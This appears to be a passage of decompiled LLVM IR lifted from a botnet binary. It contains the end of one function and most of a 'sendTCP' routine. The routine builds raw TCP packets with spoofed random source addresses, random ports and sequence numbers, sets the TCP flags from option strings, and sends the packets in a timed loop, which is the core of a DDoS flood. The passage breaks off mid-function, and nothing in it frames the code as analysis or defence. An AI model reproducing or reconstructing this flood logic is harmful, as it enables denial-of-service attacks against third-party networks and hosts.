  uselistorder i32 %v3_c7f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 71, 49, 48, 50, 51, 53, 52, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 66, 68, 69, 70, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_ce44, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_cd1c, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cbf0, { 1, 0 }
  uselistorder label %dec_label_pc_cac8, { 1, 0 }
  uselistorder label %dec_label_pc_ca4c, { 1, 0 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %dec_label_pc_c8f8, { 1, 0 }
  uselistorder label %dec_label_pc_c810, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_ce50 = load i32, i32* @r4, align 4
  %v6_ce50 = load i32, i32* @fp, align 4
  store i32 52824, i32* %stack_var_-4, align 4
  %v2_ce54 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ce54, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ce90 = icmp eq i32 %arg2, 0
  br i1 %v2_ce90, label %dec_label_pc_ce98, label %dec_label_pc_ceb8

dec_label_pc_ce98:                                ; preds = %entry
  %v0_ce98 = call i32 @rand_cmwc()
  %v3_cea0 = mul i32 %v0_ce98, 65536
  store i32 %v3_cea0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cedc

dec_label_pc_ceb8:                                ; preds = %entry
  %v3_cec0 = urem i32 %arg2, 65536
  store i32 %v3_cec0, i32* %r3.global-to-local, align 4
  %v1_cec8 = call i32 @htons(i32 %v3_cec0)
  br label %dec_label_pc_cedc

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ce98, %dec_label_pc_ceb8
  %v2_cee0 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_cee0, i32* %r3.global-to-local, align 4
  %v3_ceec = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_ceec, i32* %r3.global-to-local, align 4
  %v2_cef4 = icmp eq i32 %v3_ceec, 0
  br i1 %v2_cef4, label %dec_label_pc_cf00, label %dec_label_pc_d494

dec_label_pc_cf00:                                ; preds = %dec_label_pc_cedc
  %v2_cf00 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cf24 = call i32 @socket()
  store i32 %v0_cf24, i32* %r3.global-to-local, align 4
  %v2_cf34 = icmp eq i32 %v0_cf24, 0
  br i1 %v2_cf34, label %dec_label_pc_d494, label %dec_label_pc_cf40

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cf00
  store i32 1, i32* %stack_var_-68, align 4
  %v2_cf48 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_cf48, i32* %r3.global-to-local, align 4
  %v6_cf64 = call i32 @__GI_setsockopt(i32 %v0_cf24, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_cf64, i32* %r3.global-to-local, align 4
  %v1_cf6c = icmp slt i32 %v6_cf64, 0
  br i1 %v1_cf6c, label %dec_label_pc_d494, label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf40
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_cf7c = icmp eq i32 %arg4, 0
  br i1 %v2_cf7c, label %dec_label_pc_cfa8, label %dec_label_pc_cf90

dec_label_pc_cf90:                                ; preds = %dec_label_pc_cf78
  %v1_cf94 = sub i32 32, %arg4
  store i32 %v1_cf94, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_cfa0 = shl i32 -1, %v1_cf94
  br label %dec_label_pc_cfa8

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf78, %dec_label_pc_cf90
  %storemerge10 = phi i32 [ %v1_cfa0, %dec_label_pc_cf90 ], [ 0, %dec_label_pc_cf78 ]
  %v1_cfac = add i32 %arg6, 40
  %v1_cfbc = add i32 %arg6, 46
  %v3_cfc0 = and i32 %v1_cfbc, -4
  %v1_cfc8 = load i32, i32* @sp, align 4
  %v2_cfc8 = sub i32 %v1_cfc8, %v3_cfc0
  %v1_cfd8 = add i32 %v2_cfc8, 11
  %v3_cfdc = and i32 %v1_cfd8, -4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_cffc = add i32 %v3_cfdc, 20
  store i32 %v1_cffc, i32* %r3.global-to-local, align 4
  %v5_d000 = inttoptr i32 %v1_cffc to i8*
  %v3_d004 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d004, i32* @r4, align 4
  %v1_d00c = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d00c, i32* %r3.global-to-local, align 4
  %v1_d018 = call i32 @htonl(i32 %v1_d00c)
  store i32 %v1_d018, i32* %r2.global-to-local, align 4
  %v1_d024 = add i32 %arg6, 20
  %v1_d028 = load i32, i32* @sp, align 4
  %v2_d028 = inttoptr i32 %v1_d028 to i32*
  store i32 %v1_d024, i32* %v2_d028, align 4
  %v0_d030 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_d038 = inttoptr i32 %v3_cfdc to i8*
  %v5_d038 = call i32 @makeIPPacket(i8* %v4_d038, i32 %v0_d030, i32 %v1_d018, i32 6)
  %v0_d03c = call i32 @rand_cmwc()
  %v3_d048 = urem i32 %v0_d03c, 65536
  store i32 %v3_d048, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d050 = trunc i32 %v0_d03c to i8
  store i8 %v1_d050, i8* %v5_d000, align 4
  %v0_d054 = load i32, i32* %r3.global-to-local, align 4
  %v3_d054 = sdiv i32 %v0_d054, 256
  store i32 %v3_d054, i32* %r3.global-to-local, align 4
  %v1_d058 = trunc i32 %v3_d054 to i8
  %v2_d058 = load i32, i32* %r2.global-to-local, align 4
  %v3_d058 = add i32 %v2_d058, 1
  %v4_d058 = inttoptr i32 %v3_d058 to i8*
  store i8 %v1_d058, i8* %v4_d058, align 1
  %v0_d05c = call i32 @rand_cmwc()
  %v2_d068 = add i32 %v3_cfdc, 24
  %v3_d068 = inttoptr i32 %v2_d068 to i32*
  store i32 %v0_d05c, i32* %v3_d068, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d074 = add i32 %v3_cfdc, 28
  %v3_d074 = inttoptr i32 %v2_d074 to i32*
  store i32 0, i32* %v3_d074, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d07c = add i32 %v3_cfdc, 32
  %v2_d07c = inttoptr i32 %v1_d07c to i8*
  %v3_d07c = load i8, i8* %v2_d07c, align 4
  %v1_d088 = urem i8 %v3_d07c, 16
  %v1_d08c = or i8 %v1_d088, 80
  store i8 %v1_d08c, i8* %v2_d07c, align 4
  %v3_d09c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d09c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b48.204 to i32), i32* @r1, align 4
  %v3_d0a8 = inttoptr i32 %v3_d09c to i8*
  %v4_d0a8 = call i32 @__GI_strcoll(i8* %v3_d0a8, i32 ptrtoint ([4 x i8]* @global_var_18b48.204 to i32))
  store i32 %v4_d0a8, i32* %r3.global-to-local, align 4
  %v2_d0b0 = icmp eq i32 %v4_d0a8, 0
  br i1 %v2_d0b0, label %dec_label_pc_d0b8, label %dec_label_pc_d10c

dec_label_pc_d0b8:                                ; preds = %dec_label_pc_cfa8
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d0bc = add i32 %v3_cfdc, 33
  %v2_d0bc = inttoptr i32 %v1_d0bc to i8*
  %v3_d0bc = load i8, i8* %v2_d0bc, align 1
  %v4_d0bc = zext i8 %v3_d0bc to i32
  %v1_d0c0 = or i32 %v4_d0bc, 2
  store i32 %v1_d0c0, i32* %r3.global-to-local, align 4
  %v1_d0c4 = trunc i32 %v1_d0c0 to i8
  store i8 %v1_d0c4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0cc = load i8, i8* %v2_d0bc, align 1
  %v4_d0cc = zext i8 %v3_d0cc to i32
  %v1_d0d0 = or i32 %v4_d0cc, 4
  store i32 %v1_d0d0, i32* %r3.global-to-local, align 4
  %v1_d0d4 = trunc i32 %v1_d0d0 to i8
  store i8 %v1_d0d4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0dc = load i8, i8* %v2_d0bc, align 1
  %v4_d0dc = zext i8 %v3_d0dc to i32
  %v1_d0e0 = or i32 %v4_d0dc, 1
  store i32 %v1_d0e0, i32* %r3.global-to-local, align 4
  %v1_d0e4 = trunc i32 %v1_d0e0 to i8
  store i8 %v1_d0e4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0ec = load i8, i8* %v2_d0bc, align 1
  %v4_d0ec = zext i8 %v3_d0ec to i32
  %v1_d0f0 = or i32 %v4_d0ec, 16
  store i32 %v1_d0f0, i32* %r3.global-to-local, align 4
  %v1_d0f4 = trunc i32 %v1_d0f0 to i8
  store i8 %v1_d0f4, i8* %v2_d0bc, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d0fc = load i8, i8* %v2_d0bc, align 1
  %v4_d0fc = zext i8 %v3_d0fc to i32
  %v1_d100 = or i32 %v4_d0fc, 8
  store i32 %v1_d100, i32* %r3.global-to-local, align 4
  %v1_d104 = trunc i32 %v1_d100 to i8
  store i8 %v1_d104, i8* %v2_d0bc, align 1
  br label %dec_label_pc_d234

dec_label_pc_d10c:                                ; preds = %dec_label_pc_cfa8
  %v3_d10c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d10c, i32* %r3.global-to-local, align 4
  store i32 %v3_d10c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_d118 = call i32 @__GI_strtok(i32 %v3_d10c, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  store i32 %v2_d118, i32* %r3.global-to-local, align 4
  %v2_d22c20 = icmp eq i32 %v2_d118, 0
  br i1 %v2_d22c20, label %dec_label_pc_d234, label %dec_label_pc_d128.lr.ph

dec_label_pc_d128.lr.ph:                          ; preds = %dec_label_pc_d10c
  %v1_d148 = add i32 %v3_cfdc, 33
  %v2_d148 = inttoptr i32 %v1_d148 to i8*
  br label %dec_label_pc_d128

dec_label_pc_d128:                                ; preds = %dec_label_pc_d128.lr.ph, %dec_label_pc_d214
  %storemerge1421 = phi i32 [ %v2_d118, %dec_label_pc_d128.lr.ph ], [ %v2_d21c, %dec_label_pc_d214 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b50.208 to i32), i32* @r1, align 4
  %v3_d134 = inttoptr i32 %storemerge1421 to i8*
  %v4_d134 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_18b50.208 to i32))
  store i32 %v4_d134, i32* %r3.global-to-local, align 4
  %v2_d13c = icmp eq i32 %v4_d134, 0
  br i1 %v2_d13c, label %dec_label_pc_d144, label %dec_label_pc_d158

dec_label_pc_d144:                                ; preds = %dec_label_pc_d128
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d148 = load i8, i8* %v2_d148, align 1
  %v4_d148 = zext i8 %v3_d148 to i32
  %v1_d14c = or i32 %v4_d148, 2
  store i32 %v1_d14c, i32* %r3.global-to-local, align 4
  %v1_d150 = trunc i32 %v1_d14c to i8
  store i8 %v1_d150, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d158:                                ; preds = %dec_label_pc_d128
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b54.210 to i32), i32* @r1, align 4
  %v4_d164 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_18b54.210 to i32))
  store i32 %v4_d164, i32* %r3.global-to-local, align 4
  %v2_d16c = icmp eq i32 %v4_d164, 0
  br i1 %v2_d16c, label %dec_label_pc_d174, label %dec_label_pc_d188

dec_label_pc_d174:                                ; preds = %dec_label_pc_d158
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d178 = load i8, i8* %v2_d148, align 1
  %v4_d178 = zext i8 %v3_d178 to i32
  %v1_d17c = or i32 %v4_d178, 4
  store i32 %v1_d17c, i32* %r3.global-to-local, align 4
  %v1_d180 = trunc i32 %v1_d17c to i8
  store i8 %v1_d180, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d188:                                ; preds = %dec_label_pc_d158
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b58.212 to i32), i32* @r1, align 4
  %v4_d194 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_18b58.212 to i32))
  store i32 %v4_d194, i32* %r3.global-to-local, align 4
  %v2_d19c = icmp eq i32 %v4_d194, 0
  br i1 %v2_d19c, label %dec_label_pc_d1a4, label %dec_label_pc_d1b8

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d188
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d1a8 = load i8, i8* %v2_d148, align 1
  %v4_d1a8 = zext i8 %v3_d1a8 to i32
  %v1_d1ac = or i32 %v4_d1a8, 1
  store i32 %v1_d1ac, i32* %r3.global-to-local, align 4
  %v1_d1b0 = trunc i32 %v1_d1ac to i8
  store i8 %v1_d1b0, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d1b8:                                ; preds = %dec_label_pc_d188
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b5c.214 to i32), i32* @r1, align 4
  %v4_d1c4 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_18b5c.214 to i32))
  store i32 %v4_d1c4, i32* %r3.global-to-local, align 4
  %v2_d1cc = icmp eq i32 %v4_d1c4, 0
  br i1 %v2_d1cc, label %dec_label_pc_d1d4, label %dec_label_pc_d1e8

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1b8
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d1d8 = load i8, i8* %v2_d148, align 1
  %v4_d1d8 = zext i8 %v3_d1d8 to i32
  %v1_d1dc = or i32 %v4_d1d8, 16
  store i32 %v1_d1dc, i32* %r3.global-to-local, align 4
  %v1_d1e0 = trunc i32 %v1_d1dc to i8
  store i8 %v1_d1e0, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1b8
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b60.216 to i32), i32* @r1, align 4
  %v4_d1f4 = call i32 @__GI_strcoll(i8* %v3_d134, i32 ptrtoint ([4 x i8]* @global_var_18b60.216 to i32))
  store i32 %v4_d1f4, i32* %r3.global-to-local, align 4
  %v2_d1fc = icmp eq i32 %v4_d1f4, 0
  br i1 %v2_d1fc, label %dec_label_pc_d204, label %dec_label_pc_d214

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1e8
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v3_d208 = load i8, i8* %v2_d148, align 1
  %v4_d208 = zext i8 %v3_d208 to i32
  %v1_d20c = or i32 %v4_d208, 8
  store i32 %v1_d20c, i32* %r3.global-to-local, align 4
  %v1_d210 = trunc i32 %v1_d20c to i8
  store i8 %v1_d210, i8* %v2_d148, align 1
  br label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %dec_label_pc_d1e8, %dec_label_pc_d1d4, %dec_label_pc_d1a4, %dec_label_pc_d174, %dec_label_pc_d144, %dec_label_pc_d204
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_d21c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  store i32 %v2_d21c, i32* %r3.global-to-local, align 4
  %v2_d22c = icmp eq i32 %v2_d21c, 0
  br i1 %v2_d22c, label %dec_label_pc_d234, label %dec_label_pc_d128

dec_label_pc_d234:                                ; preds = %dec_label_pc_d214, %dec_label_pc_d10c, %dec_label_pc_d0b8
  %v0_d234 = call i32 @rand_cmwc()
  %v3_d240 = urem i32 %v0_d234, 65536
  store i32 %v3_d240, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d248 = trunc i32 %v0_d234 to i8
  %v3_d248 = add i32 %v3_cfdc, 34
  %v4_d248 = inttoptr i32 %v3_d248 to i8*
  store i8 %v1_d248, i8* %v4_d248, align 2
  %v0_d24c = load i32, i32* %r3.global-to-local, align 4
  %v3_d24c25 = udiv i32 %v0_d24c, 256
  %v1_d250 = trunc i32 %v3_d24c25 to i8
  %v2_d250 = load i32, i32* %r2.global-to-local, align 4
  %v3_d250 = add i32 %v2_d250, 15
  %v4_d250 = inttoptr i32 %v3_d250 to i8*
  store i8 %v1_d250, i8* %v4_d250, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d25c = add i32 %v3_cfdc, 36
  %v4_d25c = inttoptr i32 %v3_d25c to i8*
  store i8 0, i8* %v4_d25c, align 4
  %v0_d260 = load i32, i32* %r3.global-to-local, align 4
  %v1_d260 = trunc i32 %v0_d260 to i8
  %v2_d260 = load i32, i32* %r2.global-to-local, align 4
  %v3_d260 = add i32 %v2_d260, 17
  %v4_d260 = inttoptr i32 %v3_d260 to i8*
  store i8 %v1_d260, i8* %v4_d260, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d26c = add i32 %v3_cfdc, 38
  %v4_d26c = inttoptr i32 %v3_d26c to i8*
  store i8 0, i8* %v4_d26c, align 2
  %v0_d270 = load i32, i32* %r3.global-to-local, align 4
  %v1_d270 = trunc i32 %v0_d270 to i8
  %v2_d270 = load i32, i32* %r2.global-to-local, align 4
  %v3_d270 = add i32 %v2_d270, 19
  %v4_d270 = inttoptr i32 %v3_d270 to i8*
  store i8 %v1_d270, i8* %v4_d270, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ce90, label %dec_label_pc_d280, label %dec_label_pc_d298

dec_label_pc_d280:                                ; preds = %dec_label_pc_d234
  %v0_d280 = call i32 @rand_cmwc()
  %v3_d288 = mul i32 %v0_d280, 65536
  store i32 %v3_d288, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_d280 to i8
  br label %dec_label_pc_d2b4

dec_label_pc_d298:                                ; preds = %dec_label_pc_d234
  %v3_d2a0 = urem i32 %arg2, 65536
  store i32 %v3_d2a0, i32* %r3.global-to-local, align 4
  %v1_d2a8 = call i32 @htons(i32 %v3_d2a0)
  %extract.t71 = trunc i32 %v1_d2a8 to i8
  br label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %dec_label_pc_d280, %dec_label_pc_d298
  %v0_d280.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_d280 ], [ %extract.t71, %dec_label_pc_d298 ]
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v4_d2b8 = sext i8 %v0_d280.sink.off0 to i32
  %v3_d2bc = add i32 %v3_cfdc, 22
  %v4_d2bc = inttoptr i32 %v3_d2bc to i8*
  store i8 %v0_d280.sink.off0, i8* %v4_d2bc, align 2
  %v3_d2c4 = sdiv i32 %v4_d2b8, 256
  %v4_d2c4 = trunc i32 %v3_d2c4 to i8
  store i32 %v3_d2c4, i32* %r3.global-to-local, align 4
  %v4_d2c8 = add i32 %v3_cfdc, 23
  %v5_d2c8 = inttoptr i32 %v4_d2c8 to i8*
  store i8 %v4_d2c4, i8* %v5_d2c8, align 1
  %v5_d2d4 = call i32 @tcpcsum(i32 %v3_cfdc, i32 %v1_cffc, i32 %v1_cffc, i32 %v3_d2c4)
  %sext = mul i32 %v5_d2d4, 16777216
  %v1_d2d8 = sdiv i32 %sext, 16777216
  store i32 %v1_d2d8, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d2e0 = trunc i32 %v1_d2d8 to i8
  store i8 %v1_d2e0, i8* %v4_d25c, align 4
  %v0_d2e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d2e428 = udiv i32 %v0_d2e4, 256
  %v1_d2e8 = trunc i32 %v3_d2e428 to i8
  %v2_d2e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2e8 = add i32 %v2_d2e8, 17
  %v4_d2e8 = inttoptr i32 %v3_d2e8 to i8*
  store i8 %v1_d2e8, i8* %v4_d2e8, align 1
  %v1_d2f8 = or i32 %v3_cfdc, 2
  store i32 %v1_d2f8, i32* %r3.global-to-local, align 4
  %v1_d2fc = inttoptr i32 %v1_d2f8 to i8*
  %v2_d2fc = load i8, i8* %v1_d2fc, align 2
  %v3_d2fc = zext i8 %v2_d2fc to i32
  store i32 %v3_d2fc, i32* %r2.global-to-local, align 4
  %v1_d300 = or i32 %v1_cfd8, 3
  %v2_d300 = inttoptr i32 %v1_d300 to i8*
  %v3_d300 = load i8, i8* %v2_d300, align 1
  %v4_d300 = zext i8 %v3_d300 to i32
  %v4_d304 = mul nuw nsw i32 %v4_d300, 256
  %v5_d304 = or i32 %v4_d304, %v3_d2fc
  store i32 %v5_d304, i32* %r3.global-to-local, align 4
  %v3_d310 = call i32 @csum(i8* %v4_d038, i32 %v5_d304)
  %sext4 = mul i32 %v3_d310, 16777216
  %v1_d314 = sdiv i32 %sext4, 16777216
  store i32 %v1_d314, i32* %r3.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d31c = trunc i32 %v1_d314 to i8
  %v3_d31c = add i32 %v3_cfdc, 10
  %v4_d31c = inttoptr i32 %v3_d31c to i8*
  store i8 %v1_d31c, i8* %v4_d31c, align 2
  %v0_d320 = load i32, i32* %r3.global-to-local, align 4
  %v3_d320 = sdiv i32 %v0_d320, 256
  store i32 %v3_d320, i32* %r3.global-to-local, align 4
  %v1_d324 = trunc i32 %v3_d320 to i8
  %v2_d324 = load i32, i32* %r2.global-to-local, align 4
  %v3_d324 = add i32 %v2_d324, 11
  %v4_d324 = inttoptr i32 %v3_d324 to i8*
  store i8 %v1_d324, i8* %v4_d324, align 1
  %v2_d32c = call i32 @__GI_time(i32* null)
  %v2_d338 = add i32 %v2_d32c, %arg3
  store i32 %v2_d338, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d390 = add i32 %v3_cfdc, 12
  %v3_d390 = inttoptr i32 %v2_d390 to i32*
  %v3_d3a8 = add i32 %v3_cfdc, 4
  %v4_d3a8 = inttoptr i32 %v3_d3a8 to i8*
  %v4_d3f0 = add i32 %v3_cfdc, 37
  %v5_d3f0 = inttoptr i32 %v4_d3f0 to i8*
  br label %dec_label_pc_d34c

dec_label_pc_d34c:                                ; preds = %dec_label_pc_d484, %dec_label_pc_d478, %dec_label_pc_d2b4
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_d2b4 ], [ 0, %dec_label_pc_d478 ], [ %v1_d488, %dec_label_pc_d484 ]
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d354 = load i32, i32* @sp, align 4
  %v2_d354 = inttoptr i32 %v1_d354 to i32*
  store i32 %v2_cf00, i32* %v2_d354, align 4
  %v1_d35c = load i32, i32* @sp, align 4
  %v2_d35c = add i32 %v1_d35c, 4
  %v3_d35c = inttoptr i32 %v2_d35c to i32*
  store i32 16, i32* %v3_d35c, align 4
  %v0_d364 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_cfac, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_d370 = inttoptr i32 %v0_d364 to i32*
  %v7_d370 = call i32 @__libc_sendto(i32 %v0_cf24, i32* %v6_d370, i32 %v1_cfac, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d378 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_d378, i32* %r3.global-to-local, align 4
  %v1_d384 = call i32 @htonl(i32 %v1_d378)
  store i32 %v1_d384, i32* %r2.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r3.global-to-local, align 4
  store i32 %v1_d384, i32* %v3_d390, align 4
  %v0_d394 = call i32 @rand_cmwc()
  %v3_d3a0 = urem i32 %v0_d394, 65536
  store i32 %v3_d3a0, i32* %r3.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d3a8 = trunc i32 %v0_d394 to i8
  store i8 %v1_d3a8, i8* %v4_d3a8, align 4
  %v0_d3ac = load i32, i32* %r3.global-to-local, align 4
  %v3_d3ac = sdiv i32 %v0_d3ac, 256
  store i32 %v3_d3ac, i32* %r3.global-to-local, align 4
  %v1_d3b0 = trunc i32 %v3_d3ac to i8
  %v2_d3b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3b0 = add i32 %v2_d3b0, 5
  %v4_d3b0 = inttoptr i32 %v3_d3b0 to i8*
  store i8 %v1_d3b0, i8* %v4_d3b0, align 1
  %v0_d3b4 = call i32 @rand_cmwc()
  store i32 %v0_d3b4, i32* %r2.global-to-local, align 4
  store i32 %v1_cffc, i32* %r3.global-to-local, align 4
  store i32 %v0_d3b4, i32* %v3_d068, align 4
  %v0_d3c4 = call i32 @rand_cmwc()
  %v3_d3d0 = urem i32 %v0_d3c4, 65536
  store i32 %v3_d3d0, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d3d8 = trunc i32 %v0_d3c4 to i8
  store i8 %v1_d3d8, i8* %v5_d000, align 4
  %v0_d3dc = load i32, i32* %r3.global-to-local, align 4
  %v3_d3dc29 = udiv i32 %v0_d3dc, 256
  %v1_d3e0 = trunc i32 %v3_d3dc29 to i8
  %v2_d3e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3e0 = add i32 %v2_d3e0, 1
  %v4_d3e0 = inttoptr i32 %v3_d3e0 to i8*
  store i8 %v1_d3e0, i8* %v4_d3e0, align 1
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_d25c, align 4
  store i8 0, i8* %v5_d3f0, align 1
  %v5_d3fc = call i32 @tcpcsum(i32 %v3_cfdc, i32 %v1_cffc, i32 %v1_cffc, i32 0)
  %sext5 = mul i32 %v5_d3fc, 16777216
  %v1_d400 = sdiv i32 %sext5, 16777216
  store i32 %v1_d400, i32* %r3.global-to-local, align 4
  store i32 %v1_cffc, i32* %r2.global-to-local, align 4
  %v1_d408 = trunc i32 %v1_d400 to i8
  store i8 %v1_d408, i8* %v4_d25c, align 4
  %v0_d40c = load i32, i32* %r3.global-to-local, align 4
  %v3_d40c30 = udiv i32 %v0_d40c, 256
  %v1_d410 = trunc i32 %v3_d40c30 to i8
  %v2_d410 = load i32, i32* %r2.global-to-local, align 4
  %v3_d410 = add i32 %v2_d410, 17
